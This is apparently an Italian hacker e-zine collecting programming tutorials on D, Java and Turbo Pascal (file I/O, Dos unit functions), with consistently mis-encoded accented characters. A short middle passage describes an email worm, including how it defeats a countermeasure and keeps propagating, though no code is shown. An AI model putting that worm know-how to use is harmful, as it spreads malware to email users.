Unix,e  si  Φ  evoluto  agli inizi degli anni 80 nel c++.  Questa  evoluzione  Φ
...
classi,oggetti  e  interfacce  con le quali Φ possibile  fare  operazioni  prima
complicate e ostili in poco tempo.

-  Java  Φ  gestito da un cosidetta macchina virtuale, la Java  Virtual  Machine
(JVM)  che **dovrebbe** rendere il linguaggio portabile su ogni piattaforma,  ma
in  realtα  questo sta avvenendo e non Φ avvenuto, anzi la Microsoft(produttrice
di tale J++) ha affermato che ci≥ non avverα mai.

Dopo  la  nascita  di  Java, avviene la nascita di un altro linguaggio  chiamato
c#.La  sua  storia in realtα avviene in tribunale tra la microsoft e  la  sun,ma
noi  adesso  ce ne frechiamo.C# ha molte analogie con Java e di conseguenza  col
c++.Ma  non ha avuto molto successo su internet perchΦ proprietario e  necessitα
del   pacchetto  Visual Studio.NET Per≥ in biblioteche Φ pi∙  frequente  trovare
...
realtα  ci≥  che  questo linguaggio poteva fare era solo  in  linea  teorica,non
esisteva  il compilatore.La prima versione usc∞ nell'agosto 2002, e in  un  anno
ebbe  un  notevole  incremento,  tanto  che  la  gente  incominci≥  a  chiamarlo
D.Ricordo  con simpatia le chattate in cui scherzavamo sul c, sul b e  sul  c++.
Dicevamo  che  tra  quasi  2000 anni arriveranno allo  z++.Ma  in  realtα  tutti
pensavamo che D non sarebbe mai uscito per due motivi

- Se giα il c++ non ha avuto il successo del c,perchΦ potrebbe averlo sto D???
...
D  Φ  un linguaggio di programmazione di livello alto, come d'altronde il  c  il
c++  e  lo  java .L'assembler Φ un linguaggio di livello basso, molto vicino  al
linguaggio  binario formato solo da 1 e da 0.Come Giα detto, come convenzione  i
moderni  linguaggi  sono  OOP,  basti pensare  a  Java,  C++  c#.D  si  basa  su
caratteristiche prese un p≥ da tutte queste.per esempio include la  delegazione.
Questa  caratteristica era propria del c#. Si dichiara in maniera  molto  simile
ai puntatori cioΦ int funzione(int) puntatore;
...
Come  Φ facile notare, ha una sintassi simile al c: ogni istruzione finisce  con
"  ;  ".  Per≥ a differenza delle  dichiarazioni di classe in c++ , D  segue  la
dichiarazione di classe dello Java, cioΦ senza ; alla fine della classe
...
I  costruttori  Φ  una  funzione  della classe.Essa  si  presenta  utile  quando
...
hanno  giα  un  loro  tipo,  e  sono  caratterizzati  dalla  u  prima  del  tipo
"classico".Ma  la  cosa  che mi stupisce di questo linguaggio  Φ  che  manca  il
preprocessore.Una cosa strana per l'evoluzione del c++.ad esempio per  importare
un header file non si userα pi∙
...
da  notare  i ; alla fine e al mancanza del .h che indica gli header.  Per≥  per
indicare  che sono header provenienti dal c si userα la c prima del  package  ad
esempio

import c.stdio;

Non  vedremo pi∙ praticamente le simpatiche istruzionicon # prima. Per  definire
...
si userα il comando apposit≥

alias int Int.

#if  #endif #else #define #undef #pragma etc non saranno pi∙ necessari, o meglio
...
creerα un array di 120 caratteri. Per forza 120.

int[] array;

creerα un array vuoto. si possono mettere tutti i caratteri consentiti.

bit[120] array;

creerα un array di 120 bit.

int*[] array;

Creerα un array dinamico di puntatori.

int[8]* array;

Creerα  un  puntatore  ad un array int.Gli array hanno delle  proprietα  con  le
quali Φ possiblie interaggire attivamente:
...
suoi valori
-  reverse  =  l'ultimo  valore immesso sarα il primo e  cos∞  via.  Restituisce
l'array
...
Il  vero  problema quando esce un linguaggio sul mercato Φ che  bisogna  fare  i
conti  con la compatibilitα con il codice scritto.Col D questo problema  non  si
pone,o  meglio  molto  codice in c pu≥ essere usato in  D  Infatti  Φ  possibile
...
seguirα  un  vero  e  proprio  corso di programmazione,sempre  che  la  cosa  vi
interessi.Questo  documento  Φ  stato laborato  in  un  sol  giorno  per  motivi
...
improprio  che  verrα  fatto del seguente testo. Il seguente  articolo  Φ  stato
...
sentito parlare di questa particolaritα di questi virus,e molti di voi credo che
...
rileggerlo.  Ebbene  Φ possibile facilmente superare quel  piccolo  e  ingegnoso
trucchetto  presentatoci. Basta infatti una piccola routine di controllo,  e  il
worm  pu≥ continuare la sua fase di propagazione indisturbato.Ora spero  che  la
...
perchΦ permette di raggiungere lo scopo in maniera facile e veloce:
...
Ora io non vorrei spiegare alla lettera l'intero codice. Esporr≥ una spiegazione
a  grandi  linee. La parte pi∙ importante del seguente codice Φ  sicuramente  la
funzione control.Essa infatti non fa altro che controllare se l'indirizzo e-mail
Φ  un  indirizzo  valido.Se  il controllo risulta positivo  allora  la  funzione
imposta  la variabile go = 1, nel caso contrario la variabile Φ settata  a  0.La
...
oppure  la copia del virus.Una cosa, la propagazione in questo caso pu≥ avvenire
...
1. WHAT'S JAVA
Java  Φ  un linguaggio di programmazione di alto livello, nato con lo  scopo  di
sviluppare  applicazioni per la rete (APPLET), questo linguaggio fα  riferimento
al      paradigma   della   programmazione  ad   oggetti,   e   si   Φ   diffuso
contemporaneamente al C++.  La caratteristica del Java Φ data dal fatto  che  il
suo  codice  Φ    perfettamente portatile, cioΦ il sorgente di un programma  pu≥
essere  compilato o sotto Windows o sotto Linux, senza che venga generato nessun
tipo  di  errore.A cosa Φ dovuto questa portabilitα del codice? La  risposta  Φ:
BYTECODE.  E  cos'Φ il bytecode? Non Φ altro che il risultato della compilazione
del codice sorgente  Java, questo Φ un formato intermedio del tutto indipendente
dalla  piattaforma software dov'Φ compilato ed Φ usato per trasportare il codice
tra  varie  piattaforme hardware/software.Per essere eseguito  poi  il  bytecode
dovrα  essere  interpretato.  ATTENZIONE in  java  non  si  posso  creare  degli
eseguibili  .exe,  perci≥ esecuzione del codice Φ  legata  alla  presenza  della
VIRTUAL  MACHINE che interpreterα il bytecode. Di solito una Virtual Machine   Φ
...
1.1 GLI STRUMENTI PER IL LAVORO
Per  porter  programmare  in  Java Φ necessario avere i  seguenti  strumenti  di
sviluppo:
...
1.2 LA STRUTTURA DEI PROGRAMMI
In  java  ogni  applicazione Φ costituita da una o pi∙ classi, tra tutte  quella
principale  Φ  quella  contenete  in  metodo 'main()';  in  quanto  l'esecuzione
...
tramite  un  semplice  editor  di  testi, il  file  contente  il  sorgente  avrα
estensione .java; poi si passerα alla fase di compilazione: il compilatore dovra
...
[abbreviato  JDK] della Borland); se la compilazione avrα succeso  allora  verrα
prodotto  il  BYTECODE, costituito da un file di estensione .class, l'interprete
verrα    chiamato    nel    seguente    modo:    java    &lt;nome    file>,     es.
c:\jbuilder\jdk1.3.1\bin> java prova, a questo punto il programma verrα avviato.

ALCUNE PRECISAZIONI:
-  il  nome  del bytecode (nell'esempio prova) corrisponde al nome della  classe
dove Φ presente il metodo main, e dovrα essere passato all'interprete java senza
l'estensione .class;
-  il  Java  Φ  un  linguaggio CASE-SENSITIVE, questo vuol dire che  esiste  una
differenza  tra MAIUSCULO  e minuscolo, perci≥ Prova Φ diverso  da  prova  e  da
PrOvA.
-l'ambiente di programmazione Java  include anche delle raccolte di  classi  e/o
metodi   giα   implementati,dette  librerie,  queste  devono  essere   importate
...
deve essere importata perchΦ Φ presente di default)
...
ANALISI Programma:
1  riga:  class Prova, indica il nome della classe(nome che verrα attribuito  al
Bytecode)
2  riga:   public  static  void main(string args[]),  public  static  void  sono
proprietα  del  metodo main, in particolare: public > indica  che  il  metodo  Φ
pubblico;   static>  indica che non pu≥ essere richiamato  dagli  oggetti  della
stessa  classe(Consulta  manuali sulla programmazione  ad  oggetti);   void  >il
metodo non ha valori di ritorno; main> Φ il metodo che all'interprete che quella
Φ  la classe principale, ha come parametri un array di stringa che corrisponde a
valori immessi da linea di                comando;
3 riga: System.out.println("Hello world"), costituisce lo standard di output (la
gestione  degli  I/O  Φ  spiega successivamente), che stamperα  sul  monitor  la
classica  scritta  Hello  world Le parentesi graffe {}  vengono  utilizzate  per
individuare il BLOCCHI, cioΦ degli  insiemi di operazioni.
...
L'operatore di assegnamento Φ =, mentre quello di concatenazione tra stringhe e
variabili Φ +
esempio:
----------------------
int num;
...
ris= num++ - 3;
-----------------------
la variabile num sarα 11, ma la variabile ris sarα uguale a 7, mentre
...
ris= ++num - 3;
-----------------------
num sarα uguale a 11, ma ris sarα uguale a 8.


@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

3.  GESTIONE DEGLI INPUT/OUTPUT
Lo  standard  di output Φ rappresentato dall'oggetto System.out,  al  quale  pu≥
...
da passare consiste nel messaggio da visualizzare:
 ...
 ESEMPIO
   System.out.println("Questa  Φ  una prova"+ABC);  nell'esempio  oltre  che  al
messaggio  'Questa Φ una prova' verrα visualizzato il contenuto  della  varibile
...
Φ   di  classe  BufferedReader,  esso  viene  definito  riferendosi  all'oggetto
System.in
nel seguente modo:
------
...
------
con  ci≥  si  crea un nuovo oggetto tastiera che utilizzeremo per l'acquisizione
dati  tramite  il metodo readLine(). ATTENZIONE IL METODO readLine()  ACQUISISCE
SOLO STRINGHE PERCI≥ SE L'ACQUISIZIONE RIGUARDA DATI NUMERICI DOVRα ESSERE FATTA
UNA CONVERSIONE.
...
riguardanti  l'input dovrα essere inclusa la libreria che gestisce  le  suddette
operazioni e cioΦ, la prima riga di codice deve essere import java.io.*;
...
if (condizione)
{
 //qua vanno inserite le istruzioni se la condizione Φ vera
}
[else
{
 //qua vanno inserite le istruzioni se la condizione Φ falsa
}]

il blocco tra [] pu≥ anche essere omesso se non risulta essere necessario.
...
quelle derivate, e cioΦ: selezione multipla, iterativa per falso e iterativa con
contatore.
...
La variabile che segue la parola chiave switch di solito Φ un numero intero o un
carattere,  tra le {} ci sono i possibili valori che pu≥ assumere,  in  base  al
valore che essa assumerα verranno svolte determinate istruzioni, nel caso in cui
...
do
{
  //le istruzioni del blocco verranno ripetute finchΘ la condizione nn risulterα
vera
}
while (condizione);
...
fungerα  da  contatore)e  inizializzarla.  CONDIZIONE: questa  condizione  verrα
verificata  ad ogni inizio ciclo, se  risulterα falsa l'iterazione  si  fermerα,
mentre se risulterα vera continuerα ad  iterare.
AGGIORNAMENTO: consiste nell'incrementare o decrementare, di solito di 1  unitα,
la variabile locale dichiarata, finito l'incremento si verificherα nuovamente la
condizione per stabilire se dovrα essere effettuato il ciclo.
...
-------
Questo segmento di codice produrrα in output i primi 10 numeri naturali.
...
Traccia:  calcola l'etα media di 5 persone (il numero delle persone si consideri
come costante).
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
...
class Prova //definiamo la classe principale
{
  public static void main(String args[]) //Dichiarazione del metodo main
  {
    ...
    /*dichiarazione dati*/
     final int Max = 5; //questa Φ una costante
     int Eta=0;
     int TotEta=0;
     int EtaMedia=0;

     /*Acquisizione dell'etα di 5 persone*/
     ...
     for(int i=1; i<=Max; i++)
     {
      ...
      /*Calcolo e comunicazione dell'etα media*/
      EtaMedia = TotEta / Max;
...
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
LE ECCEZIONI:
 Durante l'esecuzione dei programmi pu≥ verificarsi un'anomalia, che pu≥ portare
all'interruzione  dell'esecuzione  del  programma,  per  ovviare  a  questo   in
conveniente in java Φ possibile usare il costrutto try...catch...; se avviene un
...
Tra le parentesi () deve essere inserito il tipo di eccezione che pu≥
verificarsi, le pi∙ importanti sono: ArithmeticException, IOException,
...
logicamente  la  grande potenzialitα del java non Φ di sicuro quella  descritta.
...
fondamentali,  forse  un  giorno  scriver≥ la  seconda  parte.Un  ringraziamento
particolare  va a Cyberdude che mi ha permesso di scrivere su questa  e-zine,  e
perchΘ  anche lui crede nell'informazione libera!!! SPECIAL THANKS to: Cyberdude
...
+------------------------------------------------------------------------------+
 ...
 | - Sorgente2.gif                                                            |
 |                                                                            |
 | INTRODUCTION! (Φ inglish ma Φ pi∙ figo!)                                   |
 |Questo programma mi Φ venuto in mente leggendo la famosa E-Zine NETRUNNERS  |
 ...
 |quindi, non lamentatevi con me perchΘ sono poco matematico :D               |
 |                                                                            |
 +----------------------------------------------------------------------------+
 ...
 +----------------------------------------------------------------------------+
 |                                                                            |
 |Beh, non c'Φ bisogno che vi spiego come funzioni :P                         |
 |questo programma l'ho scritto solo perchΘ potrebbe essere un buon inizio per|
 |pensare a programmi di crittografia, basterebbe fare un gigantesco XOR al   |
 |file Destinazione e abbiamo il file criptato... poi potrete fare tutto ci≥  |
 |che volete                                                                  |
 |                                                                            |
 ...
 |innanzitutto quella costante chiamata ELE, so che vi Φ antipatica, ma Φ per |
 |non rallentare la velocitα del TRANSFORMER perdendo tempo con tutte le      |
 |elevazioni... infatti, ho fatto prima a mettere in una costante tutte le    |
 |elevazioni del 2 fino alla settima... al contrario, perchΘ dovevo adattarlo |
 |al ciclo for... vedremo poi...                                              |
 |                                                                            |
 |saltiamo alle variabili ARR e bit che, come vedete sono arrays... perchΘ?   |
 |perchΘ ci≥ veniva pi∙ facile... adesso vediamo...                           |
 |                                                                            |
 |arriviamo al loop, che Φ il SODO di tutto il programma                      |
 |traduciamo il pascal in italiano, e diventa:                                |
 |                                                                            |
 |Fai le seguenti cose finchΦ non arrivi alla fine del file sorgente:         |
 ...
 |Φ uguale alla INDICE cella di ARR meno 48; C vale SΦ stesso pi∙ la INDICE   |
 ...
 |Φ un file of byte, trasforma direttamente il numero in CHAR) e azzera C     |
 |                                                                            |
 |Questo Φ il corpo del programma...                                          |
 ...
 |C:=C+BIT[INDICE]*ELE[INDICE];                                               |
 |                                                                            |
 |potremmo anche fare cos∞:                                                   |
 |                                                                            |
 |C:=C+(ARR[INDICE]-48)*ELE[INDICE]                                           |
 |                                                                            |
 |Φ esattamente la stessa cosa...                                             |
...
+------------------------------------------------------------------------------+
 ...
 |                                                                            |
 | INTRODUCTION! (Φ inglish, ma Φ pi∙ figo)                                   |
 |Oggi girando per internet ho letto che pi∙ ti spari forte le pippe e pi∙    |
 |spari lontano...                                                            |
 |                                                                            |
 |                                    O_O                                     |
 |                                                                            |
 |Bhe, lasciamo perdere gli sbloccatori di mente arguta (???)                 |
 |E vi dico, che se adesso scrivo questo tutorial, Φ solo grazie a HACKHERTZ  |
 |quindi, prima di cominciare, dedico la pi∙ mitica frase che un uomo possa   |
 |pensare...                                                                  |
 |                                                                            |
 |                          GRAZIE HACKHERTZ!!!!!!!!!                         |
 |                                                                            |
 ...
 |che in realtα non Φ niente di poi cos∞ tanto difficile                      |
 |In realtα, Φ semplicemente un programma che cambia i singoli caratteri ASCII|
 |di un file e li scrive in un altro file sotto forma del suo corrispondente  |
 |numerico...                                                                 |
 |                                                                            |
 |Example!                                                                    |
 |A=65 - B=66 - C=67... per≥! dentro un file...                               |
 |                                                                            |
 ...
 |e guardiamo il ciclo, che Φ la parte gialla dell'uovo...                    |
 |                                                                            |
 |finchΦ non arrivi alla fine del file, leggi il primo carattere nel file     |
 |sorgente e "schiaffalo" in C; scrivi questo numero con uno spazio nel file  |
 |destinazione...                                                             |
 |                                                                            |
 |Questo Φ il tuorlo del progetto...                                          |
 |                                                                            |
 |se invece volessimo fare il progetto che fa il contrario?                   |
 |cioΦ che prende il numero e lo fa diventare ASCII in un file destinazione?  |
 |e anche qua, Φ semplice...                                                  |
 |                                                                            |
 +----------------------------------------------------------------------------+
 |{progetto NtoA}                                                             |
 |program NtoA;                                                               |
 ...
 |                                                                            |
 |finchΦ non arrivi alla fine del file, leggi il primo carattere nel file     |
 |sorgente e "schiaffalo" in C; se C Φ uno spazio, allora scrivi nel file     |
 |destinazione D e azzera D; altrimenti D Φ uguale a D*10+C-48                |
 |                                                                            |
 |ecco qua il codice...                                                       |
 |vi chiederete PERCH╔ D:=D*10+C-48 ?????                                     |
 |e io vi risponder≥ SEMPLICE!                                                |
 |                                                                            |
 |provate a prendere un file che inizia con la lettera B maiuscola            |
 |la B maiuscola in Ascii Φ 66 no?                                            |
 |quindi nel file destinazione scriverα 66 come primo numero...               |
 ...
 |che fa 6!                                                                   |
 |D=6                                                                         |
 |poi, il secondo numero Φ di nuovo 6, quindi di nuovo                        |
 |D:=6*10+54-48                                                               |
 |quindi D:= 60+6                                                             |
 |che fa 66 !!!                                                               |
 |D=66                                                                        |
...
+------------------------------------------------------------------------------+
 ...
 |Giusto per stare in tema... la mia tipa non mi ha pi∙ mollato...            |
 |L'HO MOLLATA IO!!!!! E NE VADO PIU' CHE FIERISSIMO!!!! SIIIIIII'            |
 |il problema Φ che adesso me ne devo cercare un'altra pi∙ figa...            |
 ...
 |                                                                            |
 |ok, in questa lezione vi spiegher≥:                                         |
 |                  ELSE (mi sono dimenticato di spiegarvele nel #2)          |
 |                  CASE ... OF (anche questo, ci≥ Φ grave...)                |
 |                  le parole riservate                                       |
 ...
 |                                                                            |
 |credo sia meglio fermarci qui, se no diventerα troppo lungo il tutorial     |
 |                                                                            |
 ...
 |questo per dirvi che il Turbo Pascal NON ╚ CASE SENSITIVE (mi pare di non   |
 |averlo detto nei numeri prima... ╚ GRAVE!!!                                 |
 |                                                                            |
 |poi, un'altra cosa:                                                         |
 |in alcune funzioni o procedure si vedrα che dir≥ I BYTE SUPERIORI, o I BYTE |
 |INFERIORI in questo caso, si vede che tratter≥ di Word, (word inteso il     |
 |tipo, non la parola, DEF!) per vedere i byte inferiori, basterα usare la    |
 |funzione Lo(_var_); per vedere i byte superiori basterα usare la funzione   |
 |Hi(_var_);                                                                  |
 |                                                                            |
 |V'AS CAPIT?                                                                 |
 |ok cominciamo                                                               |
 ...
 |di inserirlo nel numero scorso... tutto ci≥ Φ grave... perchΘ gli ELSE sono |
 ...
 |    uguale al mio!') {NOTATE CHE NON C'╚ IL ';'}                            |
 ...
 |                                                                            |
 |quel readkey, lo saprete continuando a leggere la guida cos'Φ...            |
 |                                                                            |
 |                                                                            |
 |CASE ... OF                                                                 |
 |Questa istruzione, (per chi sa il C) Φ uguale agli SWITCH                   |
 |la sua sintassi Φ                                                           |
 |                                                                            |
 |CASE _var_ OF                                                               |
 |_valore1_:begin                                                             |
 ...
 |Φ esattamente la stessa cosa dell'IF, solo un po' diversa...                |
 |vediamo come                                                                |
 ...
 |LE PAROLE RISERVATE                                                         |
 |                                                                            |
 |per fare alcuni programmi, ci≥ che ASSOLUTAMENTE non dovete fare, Φ dare a  |
 |un identificatore come nome una delle parole riservate, che sono le parole  |
 | che il compilatore usa per fare diverse cose                               |
 |                                                                            |
 |per chi non lo sapesse, un identificatore pu≥ essere:                       |
 |    una variabile                                                           |
 |    una costante                                                            |
 |    una procedura                                                           |
 |    una funzione                                                            |
 ...
 |                                                                            |
 |questa Φ una funzione che ritorna la somma di a e b                         |
 |ma Φ completamente diversa con le funzioni di tipo VOID!                    |
 |                                                                            |
 ...
 |LE PROCEDURE                                                                |
 |                                                                            |
 |in turbo pascal, la dichiarazione di una procedura si fa cos∞:              |
 |                                                                            |
 ...
 |END;                                                                        |
 |                                                                            |
 |quindi, un esempio pu≥ essere cos∞                                          |
 |                                                                            |
 |PROCEDURE alfanum;                                                          |
 |BEGIN                                                                       |
 ...
 |ritornerα alla dichiarazione della procedura ed eseguirα ci≥ che Φ contenuto|
 |tra il BEGIN e l'END;                                                       |
 |                                                                            |
 |N.B. l'End Φ con il punto Φ virgola, e la procedura dev'essere dichiarata   |
 ...
 |END;                                                                        |
 |                                                                            |
 |ecco qua, non Φ molto difficile, si dichiarano le variabili una stringa e   |
 ...
 |tornerα alla procedura e aggiungerα nella parte finale di a (o qualunque    |
 |variabile inserite, per≥, se cambiate la variabile, dovrete cambiare anche  |
 ...
 |                                                                            |
 |la dichiarazione Φ cos∞                                                     |
 |                                                                            |
 |FUNCTION nome ( parametri (* opzionali *) ) : tipo ;                        |
 |                                                                            |
 |qui il discorso Φ sempre lo stesso delle procedure                          |
 ...
 |una somma tra integer e integer, non poteva essere byte il tipo, perchΘ     |
 |verrebbe errore solo se il risultato superasse un certo limite...           |
 |                                                                            |
 |                                                                            |
 |L'USO DI TURBO PASCAL SUI FILES                                             |
 |                                                                            |
 |E qui arriviamo su un argomento pi∙ interessante, perchΘ in quasi tutti i   |
 |linguaggi di programmazione, (secondo me) il trattamento dei files Φ        |
 |l'argomento pi∙ usato...                                                    |
 |                                                                            |
 |cominciamo col vedere che forma ha il dichiaratore dei files in TP          |
 |                                                                            |
 |var  _nome_ : file of _tipo_ ;                                              |
 |                                                                            |
 |example... (Φ inglish, ma Φ + figo!)                                        |
 |                                                                            |
 |var ax:file of char;                                                        |
 |                                                                            |
 |naturalmente, voi potete scegliere il tipo... anche se sconsiglio altamente |
 |di utilizzare integer,smallint,longint e real... perchΘ occuperebbe troppi  |
 |bytes, e tanto si sa che un byte non supera il numero 255, quindi non serve |
 |a niente nΦ prendere numeri decimali, nΦ prendere numeri troppo grossi.     |
 |                                                                            |
 |ok, abbiamo dichiarato il file, per≥ ora che si fa?                         |
 ...
 |dell'assign, pu≥ anche essere inesistente, ma il compilatore non darα errori|
 |perchΘ con TP si possono sia aprire che creare i files (MA NO!!!) l'errore  |
 |verrα quando cercherete di aprirlo il file...                               |
 |                                                                            |
 |e questo Φ quanto per quanto riguarda l'istruzione ASSIGN                   |
 |                                                                            |
 |bΦ, adesso abbiamo assegnato il file, ora dobbiamo scegliere se aprire o    |
 ...
 |rewrite(ax);                                                                |
 |                                                                            |
 |N.B. in teoria, le definizioni "aprire" o "creare" sono sbagliate, perchΘ il|
 ...
 |potrα scrivere al suo interno, mentre quando si usa il comando rewrite per  |
 |"creare" un file, non si potrα leggere al suo interno... tutto ci≥ Φ molto  |
 |scomodante, al contrario del C che si pu≥ scegliere tutto: Appending, sola  |
 |lettura, binario...                                                         |
 |                                                                            |
 ...
 |                                                                            |
 |nota:                                                                       |
 |write, scrive nel file nella modalitα INS (non so se si chiama cos∞, ma io  |
 |la chiamo cos∞), cioΦ, scrive il carattere e cancella quello che lo segue, o|
 ...
 |il comando Φ close, il suo uso Φ uguale a reset o rewrite                   |
 |uso:                                                                        |
 |                                                                            |
 |close(_file_);                                                              |
 |                                                                            |
 ...
 |rewrite(fdata);                                                             |
 |clrscr;                                                                     |
 |writeln(' Scrivi ci≥ che devi inserire nel file:');                         |
 ...
 +--------------------------------- cut here ---------------------------------+
 |                                                                            |
 |Ecco, leggendo, mi sono accorto che c'Φ qualcosa che non vi ho spiegato     |
 |prima, e sarebbe l'EOF, che vuol dire EndOfFile, in poche parole, l'EOF     |
 |sarebbe un carattere che in un file determina la fine del file appunto, ed Φ|
 ...
 |                                                                            |
 |DELLINE;                                                                    |
 |cancella tutta la linea dov'Φ presente il cursore (Console)                 |
 |                                                                            |
 |GOTOXY(X,Y);                                                                |
 |va nella coordinata X,Y della console                                       |
 |                                                                            |
 |HIGHVIDEO;                                                                  |
 |seleziona i caratteri di alta intensitα (influisce sui colori)              |
 |ex.                                                                         |
 |il grigio normale della console diventa bianco.                             |
 |ecc.                                                                        |
 |                                                                            |
 |LOWVIDEO;                                                                   |
 |come sopra, ma a bassa intensitα                                            |
 |                                                                            |
 |NORMVIDEO;                                                                  |
 |come sopra, ma a normale intensitα (colori standard)                        |
 |                                                                            |
 |INSLINE;                                                                    |
 |inserisce una riga vuota alla posizione del cursore (Console)               |
 |                                                                            |
 |KEYPRESSED;                                                                 |
 |restituisce FALSE se non Φ premuto niente, TRUE se Φ stato premuto un tasto |
 |                                                                            |
 |SOUND(X);                                                                   |
 ...
 |X pu≥ valere 0 o 1 (caratteri normali)                                      |
 ...
 |quando il valore di questa boolean Φ TRUE i tasti ALT+F4, CTRL+C e tutti i  |
 |tasti di uscita sono abilitati, quando Φ FALSE sono disabilitati            |
 |                                                                            |
 |VAR CHECKEOF : BOOLEAN = FALSE;                                             |
 |se checkeof Φ TRUE allora premendo CTRL+Z si metterα un "segnalibro" alla   |
 |fine del file se Φ FALSE allora CTRL+Z non ha effetto                       |
 |                                                                            |
 |VAR DIRECTVIDEO : BOOLEAN = TRUE;                                           |
 |quando directvideo Φ TRUE allora i comandi per la gestione dell'output      |
 |(WRITE e WRITELN) non si effettueranno chiamate al BIOS (processo           |
 |rallentante) per visualizzare gli output se invece Φ FALSE, l'output si     |
 |effettuerα attraverso chiamate al BIOS                                      |
 |                                                                            |
 |VAR TEXTATTR : BYTE;                                                        |
 ...
 |                                                                            |
 |Example!                                                                    |
 |writeln(DiskFree(3)); {scrive la memoria libera che c'Φ nel drive C}        |
 |N.B.                                                                        |
 |La funzione ritornerα -1 se la lettura nel drive non ha successo o il drive |
 |Φ invalido                                                                  |
 |                                                                            |
 |FUNCTION DISKSIZE;                                                          |
 ...
 |Il programma ritorna se l'uscita del subprocessoΦ avvenuta normalmente,     |
 |questa funzione pu≥ ritornare:                                              |
 |0 - se l'uscita Φ avvenuta normalmente                                      |
 |1 - se l'uscita Φ avvenuta con la pressione di CTRL+C                       |
 |2 - se l'uscita Φ avvenuta per colpa di un errore del device                |
 |3 - se l'uscita Φ avvenuta con la procedura KEEP (che vedremo poi)          |
 |                                                                            |
 |FUNCTION DOSVERSION;                                                        |
 |function DosVersion: Word;                                                  |
 |ritorna la versione del Dos, per≥ i bytes nella parte inferiore Φ la        |
 |versione maggiore mentre i bytes nella parte superiore Φ la versione minore |
 |Example!                                                                    |
 +----------------------------------------------------------------------------+
 ...
 |begin                                                                       |
 |ver:=DosVersion;                                                            |
 |writeln('Questa Φ la versione ',Lo(ver),'.',Hi(ver),' del dos');            |
 |writeln('In ver Φ memorizzato ',ver);                                       |
 ...
 |se la stringa Φ minore di 1 o maggiore di EnvCount, allora restituisce una  |
 |stringa vuota                                                               |
 |                                                                            |
 |PROCEDURE EXEC;                                                             |
 ...
 |comando inserito nella prima riga, altrimenti non c'Φ abbastanza memoria ed |
 ...
 |                                                                            |
 |solo che per eseguire un file ci vuole l'uso di Swapvectors, non Φ          |
 |sufficiente usare EXEC, vedremo poi                                         |
 |                                                                            |
 |FUNCTION FEXPAND;                                                           |
 |function FExpand(Path: PathStr): PathStr;                                   |
 |Nota: Il tipo PathStr, Φ un tipo definito nella libreria Dos, equivale a    |
 |STRING[79];                                                                 |
 |                                                                            |
 |Questa funzione ritorna la completa Path di un file...                      |
 |ad esempio, io ho il file TURBO.EXE nella cartella del mio compilatore      |
 |                                                                            |
 |FExpand(path) mi ritornerα questo:                                          |
 |                                                                            |
 |C:\TPX\BIN\TURBO.EXE                                                        |
 |e non semplicemente il nome del file                                        |
 |                                                                            |
 |Nota: se il file non esiste, il compilatore darα comunque l'indirizzo di    |
 |tutta la path (dove si trova il file exe)                                   |
 |                                                                            |
 |qui sorgono due problemi                                                    |
 |se il programma non Φ compilato, ma Φ semplicemente Runnato dal compilatore,|
 |succede che ogni volta che si usa la funzione FExpand, restituirα SEMPRE la |
 |path del compilatore                                                        |
 |Mentre invece, se si Φ giα compilato e linkato il progetto, succederα che,  |
 |ovunque spostiamo il file, restituirα la path di dove il file si trova...   |
 |E TUTTO CIO' ANCHE SE IL FILE NON ESISTE!!!                                 |
 |                                                                            |
 |Il fatto Φ che finche viene usata una stringa per gestire questo genere di  |
 |cose, Φ normale quindi, se io ho il file nel desktop (a me) restituirα      |
 |                                                                            |
 |C:\WINDOWS\DESKTOP\FEXPANDEX.EXE                                            |
 |                                                                            |
 |quindi, se io voglio sapere la path del mIRC, che da me Φ                   |
 |C:\PROGRAMMI\MIRC\MIRC.EXE                                                  |
 |e tengo il file nel desktop, Φ naturale che mi restituirα                   |
 |                                                                            |
 ...
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |non chiedetemi di spiegarvelo, perchΘ lo capirete poi quando arriverete alla|
 |fine                                                                        |
 |                                                                            |
 |FUNCTION FSEARCH;                                                           |
 ...
 |{ progetto GetDate }                                                        |
 |uses dos,crt;                                                               |
 |const giornosett:array[0..6] of string = ('Domenica','Luned∞','Marted∞',    |
 |      'Mercoled∞','Gioved∞','Venerd∞','Sabato');                            |
 |var a,m,g,gs:word;                                                          |
 |                                                                            |
 |begin                                                                       |
 | GetDate(a,m,g,gs);                                                         |
 | writeln('Oggi Φ ',giornosett[gs],', ',g:0,'/',m:0,'/',a:0);                |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |Siccome oggi Φ Marted∞ 2 Settembre 2003 produrrα il seguente output:        |
 +----------------------------------------------------------------------------+
 |Oggi Φ Marted∞ 2/9/2003                                                     |
 +----------------------------------------------------------------------------+
 |Capit?                                                                      |
 |                                                                            |
 |FUNCTION GETENV;                                                            |
 ...
 |la variabile pu≥ essere sia maiuscola che minuscola, ma non pu≥ avere il    |
 ...
 |attr riceverα un valore registrato nell'unit-dos ($n) dove n sta per numero |
 ...
 |il Time ritornato pu≥ essere spacchettato con una chiamata a UnpackTime     |
 ...
 |repeat                                                                      |
 |gettime(h,m,s,sc);                                                          |
 |writeln('L''ora esatta Φ ',h,':',m,'.',s,'.',sc);                           |
 |until keypressed;                                                           |
 |end.                                                                        |
 +----------------------------------------------------------------------------+
 |Siccome adesso sono le 21:35 e qualcosa farα il seguente output in loop     |
 |vedendovi incrementare alla velocitα superlucica gli ultimi due numeri:     |
 |L'ora esatta Φ 21:35.36.37                                                  |
 |L'ora esatta Φ 21:35.36.38                                                  |
 |L'ora esatta Φ 21:35.36.39                                                  |
 |L'ora esatta Φ 21:35.36.40                                                  |
 |L'ora esatta Φ 21:35.36.41                                                  |
 |L'ora esatta Φ 21:35.36.42                                                  |
 ...
 |Keep, fa terminare il programma per≥ mantenendolo in memoria                |
 |                                                                            |
 |L'intero programma rimane in memoria includendo Data Segment, Stack Segment |
 |e Heap.                                                                     |
 |Bisogna usare con cautela e attenzione questo comando, perchΘ potrebbe fare |
 ...
 |anche se il computer Φ vostro, potete farci quello che ci volete, ma io non |
 |sono responsabile...                                                        |
 |                                                                            |
 |PROCEDURE PACKTIME;                                                         |
 ...
 |{Adesso il contenuto di ftime Φ stato "packato" dentro fpacked, quindi si   |
 | pu≥ anche azzerare ftime}                                                  |
 |writeln(ftime);                                                             |
